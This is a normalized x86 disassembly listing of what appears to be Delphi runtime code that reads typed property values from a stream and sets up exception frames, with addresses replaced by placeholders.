retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41ce9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41ceb0
mov eax [ ebp - 0x4 ]
call sub_41c400
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c544
retn
sub_41ceb0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c2e8
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d3b8
mov eax [ ebp - 0x4 ]
call sub_41d254
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_4034a4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_41cf72
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_4034a4
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c2e8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41cc04
mov eax [ ebp - 0x4 ]
call sub_41d254
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cf79
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_41cf80
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_41e08c
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41d208
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_41c650
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_41cfc4
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41e08c
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41d208
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41c650
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41d008
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41e08c
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41d208
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41c650
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41d058
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41e08c
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41d208
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41c650
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41d09c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_41e08c
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_41c128
mov al [ eax + lookup_table_41d0c3 ]
jmp [ eax * 4 + jump_table_41d0d1 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41c650
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404128
mov eax esi
call j_sub_404504#2
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41c650
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_40408c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_40408c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_40408c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_40408c
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_41d19c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41e08c
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41c650
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_41c650
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41c650
jmp r-xdata
jmp r-xdata
call sub_41c128
sub_41d208
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41c62c
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_41d19c
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_41e08c
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41c650
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_41d25c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_41c62c
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_41e08c
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_41d19c
mov [ edi ] eax
sub_41d299
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41d38d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_404038
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_4040d0
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac8
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d394
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4031f8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40429c
sub_41d3b8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41d588
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_4038b4#2
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41deb0
xor edx edx
push ebp
push j_sub_4038b4
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_4042f8
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_404558
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4034e8
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_414cb0
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4034e8
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_414cb0
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41d73c
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41c63c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41c63c
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_403434
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_414da4
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_41d39c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d58f
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov edi ebx
jmp r-xdata
sub_41d542
add [ eax ] eax
add [ eax ] al
test al 0x72
inc eax
add [ esi - 0x2b ] cl
inc ecx
add [ ecx - 0xbba743d ] cl
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_403a9c
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403af0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d58f
lea eax [ ebp - 0x8 ]
call sub_404038
retn
sub_41d598
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_41813c
mov ebx eax
test ebx ebx
je r-xdata
call sub_41c128
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_414e18
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d5e0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41bbbc
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_418778
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41d620
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41d66f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e7a4
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_415638
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d676
lea eax [ ebp - 0x10 ]
call sub_40f1ec
retn
sub_41d67c
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_41d72e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41c62c
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41d09c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41bbbc
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_418778
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e08c
lea eax [ ebp - 0x4 ]
call sub_405934
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_4157d4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d735
lea eax [ ebp - 0x8 ]
call sub_404038
lea eax [ ebp - 0x4 ]
call sub_405934
retn
sub_41d73c
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41da37
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41da3e
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0x24 ]
call sub_404744
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_40405c
retn
jmp [ eax * 4 + jump_table_41d7cc ]
mov eax [ rw-data ]
call sub_41c110
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414da4
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c62c
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c6ec
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414e18
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41d09c
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_414c4c
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414e18
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cf80
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4153ec
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41deec
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4150ec
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41dfa8
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415200
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41ddd0
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414e18
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c62c
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c62c
cmp al 0xd
jne r-xdata
push ebp
call sub_41d620
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d208
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415718
jmp r-xdata
push ebp
call sub_41d67c
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414da4
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d19c
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414e18
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41d09c
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41d598
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e08c
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414e18
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41d09c
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e08c
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4156b8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e08c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414da4
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41c744
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4156b8
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41d09c
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41d5e0
pop ecx
jmp r-xdata
sub_41da44
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_40408c
jmp r-xdata
mov eax [ ebx ]
call sub_4182d4
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_40911c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41daa4
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ddbf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41de8c
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41dd9d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41dd5e
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41deb0
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41deb0
mov eax [ ebp - 0x1c ]
call sub_417e2c
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41deb0
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_41deb0
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_41da44
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41deb0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_4031f0
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_417b7c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_41dd03
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_406064
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_418778
xor eax eax
push ebp
push sub_41dce3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_418930
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dcea
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4032a8
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_4188d4
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_41dd34
call sub_40275c
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403af0
jmp r-xdata
call sub_403a9c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_41be38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dda4
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41dd63
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_41bfe0
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_403a9c
call sub_403af0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dda4
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_4032a8
sub_41ddd0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41de7a
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41de4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41e08c
cmp al 0xb
je r-xdata
mov eax ebx
call sub_414b1c
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_41c128
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41c160
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41de81
lea eax [ ebp - 0x8 ]
call sub_404038
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41deb0
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_41deb0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41c650
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404128
mov eax esi
call j_sub_404504#2
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41c650
pop edx
pop esi
pop ebx
retn
sub_41deec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41df99
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41c62c
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41dfa8
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4042c0
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dfa0
lea eax [ ebp - 0x8 ]
call sub_404744
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41e08c
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41c650
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404684
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41c650
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41c650
jmp r-xdata
jmp r-xdata
call sub_41c128
sub_41dfa8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41e07f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41c62c
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
